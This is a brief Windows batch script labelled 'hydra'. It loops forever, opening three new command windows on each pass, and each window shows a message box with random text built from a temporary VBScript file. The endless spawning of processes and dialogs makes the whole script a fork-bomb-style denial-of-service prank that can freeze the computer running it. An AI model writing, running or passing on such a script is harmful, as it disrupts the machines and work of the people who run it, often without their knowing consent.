@echo off
:hydra
start cmd /c call :messageBox "BfFkWQPFDmWQAFui3POqf" "12"
start cmd /c call :messageBox "DNCOAISppfewAIOfNAWIOFFVcsdnoi" "1551"
start cmd /c call :messageBox "32GOIwapsadWFaSdifvalgvbu9" "8198"
goto hydra

:messageBox
echo msgbox "%~2", vbOKOnly, "%~1" > "%temp%\message.vbs"
cscript //nologo "%temp%\message.vbs"
del "%temp%\message.vbs"
exit /b